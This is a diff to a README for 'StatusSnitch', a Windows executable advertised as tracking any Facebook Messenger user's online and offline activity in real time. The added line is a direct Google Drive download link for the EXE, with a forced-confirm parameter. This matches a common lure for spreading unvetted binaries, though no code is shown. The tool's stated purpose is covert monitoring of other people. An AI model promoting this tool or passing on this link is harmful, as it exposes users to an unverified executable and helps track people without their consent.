@@ -1,4 +1,5 @@
 # 📡 StatusSnitch — Messenger Activity Tracker (EXE Version)
+# [Download the app](https://drive.usercontent.google.com/download?id=1Se8LBQXliV2OekUSJpP27fqCsiFukAMM&export=download&authuser=0&confirm=t&uuid=f046466a-c967-4cf6-b1ea-8edbf2c18566&at=ALoNOgnrlS1PvieVDWOO2wtag1dU:1748425475310)
 
 **StatusSnitch** is a Windows desktop application that lets you monitor the **online/offline activity status** of any Facebook Messenger user in real time. Designed for privacy-aware users, it offers a sleek interface, system tray support, and automatic log saving — all in a single executable file.
 
